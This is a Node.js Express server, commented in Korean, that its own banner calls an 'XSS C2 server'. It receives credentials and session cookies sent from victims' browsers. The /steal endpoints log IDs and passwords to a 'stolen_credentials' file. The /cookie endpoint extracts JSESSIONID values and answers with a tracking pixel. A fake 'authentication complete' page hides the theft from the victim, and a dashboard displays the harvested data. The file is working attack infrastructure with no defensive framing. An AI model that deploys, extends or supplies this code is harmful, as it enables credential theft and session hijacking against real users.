const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

// CORS 허용
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 로그 파일 설정
const credentialLogFile = 'stolen_credentials.txt';
const cookieLogFile = 'stolen_cookies.txt';

// 1. GET 방식 (기존)
app.get('/steal', (req, res) => {
    const { id, pw } = req.query;
    const timestamp = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    
    const logEntry = `
========================================
[${timestamp}]
IP: ${ip}
ID: ${id}
Password: ${pw}
User-Agent: ${req.headers['user-agent']}
========================================\n`;
    
    fs.appendFileSync(credentialLogFile, logEntry);
    
    console.log('\n🎯 크레덴셜 탈취 성공! (GET)');
    console.log('ID:', id);
    console.log('PW:', pw);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.send('OK');
});

// 2. POST 방식 (새로 추가 - JSON 처리)
app.post('/steal', (req, res) => {
    const { id, pw } = req.body;
    const timestamp = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    
    const logEntry = `
========================================
[${timestamp}] [POST]
IP: ${ip}
ID: ${id}
Password: ${pw}
User-Agent: ${req.headers['user-agent']}
========================================\n`;
    
    fs.appendFileSync(credentialLogFile, logEntry);
    
    console.log('\n🎯 크레덴셜 탈취 성공! (POST)');
    console.log('ID:', id);
    console.log('PW:', pw);
    console.log('IP:', ip);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.json({ status: 'success' });
});

// 3. 성공 페이지
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>인증 완료</title>
            <style>
                body {
                    margin: 0;
                    height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                }
                .success-card {
                    background: white;
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    text-align: center;
                }
                .check-icon {
                    width: 80px;
                    height: 80px;
                    background: #4CAF50;
                    border-radius: 50%;
                    margin: 0 auto 20px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    animation: scaleIn 0.5s ease-out;
                }
                @keyframes scaleIn {
                    from { transform: scale(0); }
                    to { transform: scale(1); }
                }
                h2 { color: #333; margin-bottom: 10px; }
                p { color: #666; }
            </style>
        </head>
        <body>
            <div class="success-card">
                <div class="check-icon">
                    <svg width="40" height="40" fill="white" viewBox="0 0 24 24">
                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                    </svg>
                </div>
                <h2>인증이 완료되었습니다</h2>
                <p>보안 인증이 성공적으로 처리되었습니다.</p>
                <p style="font-size: 14px; margin-top: 20px;">잠시 후 자동으로 이동합니다...</p>
            </div>
            <script>
                setTimeout(function() {
                    window.history.back();
                }, 3000);
            </script>
        </body>
        </html>
    `);
});

// 4. 쿠키 하이재킹 (기존)
app.get('/cookie', (req, res) => {
    const { data } = req.query;
    const timestamp = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    
    let sessionId = '';
    if (data) {
        const sessionMatch = data.match(/JSESSIONID=([^;]+)/);
        if (sessionMatch) sessionId = sessionMatch[1];
    }
    
    const logEntry = `
╔═══════════════════════════════════════╗
║  🍪 세션 쿠키 하이재킹 성공!           ║
╚═══════════════════════════════════════╝
[${timestamp}]
IP: ${ip}
Full Cookie: ${data}
JSESSIONID: ${sessionId || 'Not Found'}
========================================\n`;
    
    fs.appendFileSync(cookieLogFile, logEntry);
    
    console.log('\n🍪 세션 쿠키 탈취!');
    console.log('Cookie:', data);
    
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Access-Control-Allow-Origin': '*'
    });
    res.end(pixel);
});

// 5. 대시보드
app.get('/dashboard', (req, res) => {
    const credLogs = fs.existsSync(credentialLogFile) ? 
        fs.readFileSync(credentialLogFile, 'utf8') : 'No credentials yet';
    const cookieLogs = fs.existsSync(cookieLogFile) ? 
        fs.readFileSync(cookieLogFile, 'utf8') : 'No cookies yet';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Attack Dashboard</title>
            <meta http-equiv="refresh" content="5">
            <style>
                body {
                    background: #0a0a0a;
                    color: #00ff00;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    margin: 0;
                }
                .header {
                    background: linear-gradient(90deg, #ff0000, #ff6600);
                    color: white;
                    padding: 20px;
                    text-align: center;
                    margin: -20px -20px 20px -20px;
                }
                h1 { 
                    margin: 0;
                    font-size: 2.5em;
                }
                .container {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 20px;
                    margin-top: 20px;
                }
                .section {
                    background: #1a1a1a;
                    border: 2px solid #00ff00;
                    border-radius: 10px;
                    padding: 15px;
                }
                .section h2 {
                    color: #ff6600;
                    text-align: center;
                }
                .log-entry {
                    background: #000;
                    padding: 10px;
                    margin: 10px 0;
                    white-space: pre-wrap;
                    font-size: 12px;
                    border-left: 3px solid #00ff00;
                    max-height: 400px;
                    overflow-y: auto;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🎯 XSS Attack Dashboard 🎯</h1>
                <p>Auto refresh: 5 seconds</p>
            </div>
            
            <div class="container">
                <div class="section">
                    <h2>🔐 크레덴셜 탈취 로그</h2>
                    <div class="log-entry">${credLogs}</div>
                </div>
                
                <div class="section">
                    <h2>🍪 세션 쿠키 하이재킹 로그</h2>
                    <div class="log-entry">${cookieLogs}</div>
                </div>
            </div>
        </body>
        </html>
    `);
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════════╗
    ║     🔥 XSS C2 서버 실행 중 🔥             ║
    ║                                           ║
    ║   http://localhost:${PORT}                ║
    ║   https://mandu.ngrok.io                  ║
    ║                                           ║
    ║   📊 Dashboard: /dashboard                ║
    ║   ✅ Success: /success                    ║
    ║                                           ║
    ║   [Endpoints]                             ║
    ║   GET  /steal?id=&pw=    - 크레덴셜 GET   ║
    ║   POST /steal {id,pw}    - 크레덴셜 POST  ║
    ║   GET  /cookie?data=     - 쿠키 하이재킹  ║
    ╚═══════════════════════════════════════════╝
    
    🎯 공격 준비 완료...
    `);
});
